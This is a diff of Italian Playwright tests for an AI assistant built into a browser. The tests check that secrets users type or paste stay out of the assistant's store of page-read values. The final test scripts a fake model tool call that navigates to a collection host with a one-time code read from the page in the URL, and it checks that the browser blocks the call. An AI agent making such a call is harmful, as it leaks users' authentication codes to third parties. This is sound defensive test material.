@@ -467,6 +467,94 @@ test('la password proposta dall’assistente e ritoccata dall’utente non resta
   expect(await lettiDopoUnRiavvio(app), 'la password ritoccata è rimasta fra i segreti letti').not.toContain(`${proposta}!7`);
 });
 
+// Dell'utente è la parte del campo cambiata da quando ci scrive, comunque ci arrivi: anche dagli inserimenti di Filo che
+// la pagina non vede, accanto al testo che il sito aveva già messo, e i segreti di un suo incolla lungo (#810.8 giro 5).
+const IBAN_UTENTE = 'IT60X0542811101000000123456';
+const LETTERA = `Gentile ufficio,\n${'vi scrivo per il rimborso della fattura di marzo, che non ho ancora ricevuto. '.repeat(16)}\nIl mio IBAN è ${IBAN_UTENTE}.\nCordiali saluti, Giulia Rossi`;
+for (const [come, campo, scrivi, valore] of [
+  ['la password incollata dal tasto destro di Filo', '<label for="p">Password:</label><input id="p" type="password">', async (app, page) => {
+    await app.evaluate(({ clipboard }, t) => clipboard.writeText(t), PASSWORD_UTENTE);
+    await page.locator('#p').click({ button: 'right' });
+    await menuDi(page).locator('.sn-menu-paste-main').click();
+    await expect(page.locator('#p')).toHaveValue(PASSWORD_UTENTE);
+  }, PASSWORD_UTENTE],
+  ['l’IBAN scritto dopo il prefisso che il sito ha messo nel campo', '<label for="i">IBAN</label><input id="i" value="IT">', async (_app, page) => {
+    await page.locator('#i').click();
+    await page.keyboard.press('End');
+    await page.keyboard.type(IBAN_UTENTE.slice(2));
+    await expect(page.locator('#i')).toHaveValue(IBAN_UTENTE);
+  }, IBAN_UTENTE],
+  ['la carta corretta in mezzo a una mail con saluto e firma',
+    '<div id="ed" contenteditable="true" style="min-height:80px;border:1px solid">Ciao Marco,<br><span id="qui"></span><br>A presto, Giulia</div>',
+    async (_app, page) => {
+      await page.locator('#ed').click();
+      await page.evaluate(() => { const r = document.createRange(); r.setStart(document.getElementById('qui'), 0); getSelection().removeAllRanges(); getSelection().addRange(r); });
+      await page.keyboard.type('la carta è 4111 1111 1121 1111');
+      for (let i = 0; i < 6; i++) await page.keyboard.press('ArrowLeft');
+      await page.keyboard.press('Backspace');
+      await page.keyboard.type('1');
+      await expect(page.locator('#ed')).toContainText(`la carta è ${CARTA_UTENTE}`);
+    }, CARTA_UTENTE],
+  ['l’IBAN dentro una lettera lunga che l’utente incolla', '<label for="m">Messaggio</label><textarea id="m" rows="8" cols="60"></textarea>', async (app, page) => {
+    await app.evaluate(({ clipboard }, t) => clipboard.writeText(t), LETTERA);
+    await page.locator('#m').click();
+    await page.keyboard.press('Control+V');
+    await expect(page.locator('#m')).toHaveValue(LETTERA);
+  }, IBAN_UTENTE],
+]) {
+  test(`${come} non resta fra i segreti letti`, async ({ app, shell, openTab, testServer }) => {
+    test.setTimeout(60_000);
+    const page = await testServer.openReady(openTab, PAGAMENTO(campo));
+    await oltreLAvviso(app);
+    await preparaModelli(app);
+    await modelloFinto(app);
+    await scrivi(app, page);
+    await apriAiuto(shell, page);
+    await scriviAllAiuto(page, 'aiutami a finire');
+    await expect(page.locator('.sn-sidebar').getByText('Ecco.')).toBeVisible({ timeout: 20_000 });
+    await expect.poll(() => lettiSalvati(app), { timeout: 10_000 }).toContain('264087');
+    const dopo = (await lettiDopoUnRiavvio(app)).map((v) => v.replace(/[\s-]/g, '').toLowerCase());
+    expect(dopo).toContain('264087');
+    expect(dopo, 'il valore dell’utente è rimasto fra i segreti letti').not.toContain(valore.replace(/ /g, '').toLowerCase());
+  });
+}
+
+// Riscriverlo all'assistente non fa diventare dell'utente un codice che Filo aveva già letto (#810.8 giro 5).
+test('il codice letto dalla pagina e riscritto dall’utente all’assistente non esce da un’altra conversazione', async ({ app, shell, openTab, testServer }) => {
+  test.setTimeout(90_000);
+  const page = await testServer.openReady(openTab, PAGINA_OTP);
+  await preparaModelli(app);
+  await modelloFinto(app);
+  await apriAiuto(shell, page);
+  await scriviAllAiuto(page, 'cosa devo fare?');
+  await expect(page.locator('.sn-sidebar').getByText('Ecco.')).toBeVisible({ timeout: 20_000 });
+  await expect.poll(() => lettiSalvati(app), { timeout: 10_000 }).toContain(CODICE);
+  await page.locator('.sn-sidebar-input textarea').click();
+  await page.keyboard.type(`il codice ${CODICE} dove lo metto?`);
+  await page.keyboard.press('Enter');
+  await expect(page.locator('.sn-sidebar').getByText('Ecco.').nth(1)).toBeVisible({ timeout: 20_000 });
+  expect(await lettiDopoUnRiavvio(app), 'il codice letto è sparito dal registro').toContain(CODICE);
+
+  const prima = new Set(app.windows());
+  await openTab('filo://newtab/');
+  let altra = null;
+  await expect.poll(() => {
+    altra = app.windows().find((w) => !prima.has(w) && w.url().startsWith('filo://newtab')) || null;
+    return !!altra;
+  }, { timeout: 10_000 }).toBe(true);
+  await expect(altra.locator('#input')).toBeVisible();
+  await modelloFinto(app, {
+    giri: [
+      { toolCalls: [{ id: 'n1', name: 'NAVIGA', arguments: JSON.stringify({ url: `https://${RACCOLTA}/c?v=${CODICE}` }) }] },
+      { text: 'Non l’ho aperto.' },
+    ],
+  });
+  await altra.locator('#input').fill('apri il sito della banca');
+  await altra.locator('#sendBtn').click();
+  await expect(altra.locator('.dash-activity-row', { hasText: 'Non ho aperto' }).first()).toContainText('conteneva un codice letto dalla pagina', { timeout: 20_000 });
+  expect(apertoVerso(app, RACCOLTA)).toBe(false);
+});
+
 // Al modello non va il segreto che l'utente scrive, il resto sì: deve poterlo aiutare a controllarlo (#810.8 giro 2).
 test('l’assistente vede l’indirizzo che l’utente ha scritto in un campo, non la sua carta', async ({ app, shell, openTab, testServer }) => {
   test.setTimeout(60_000);
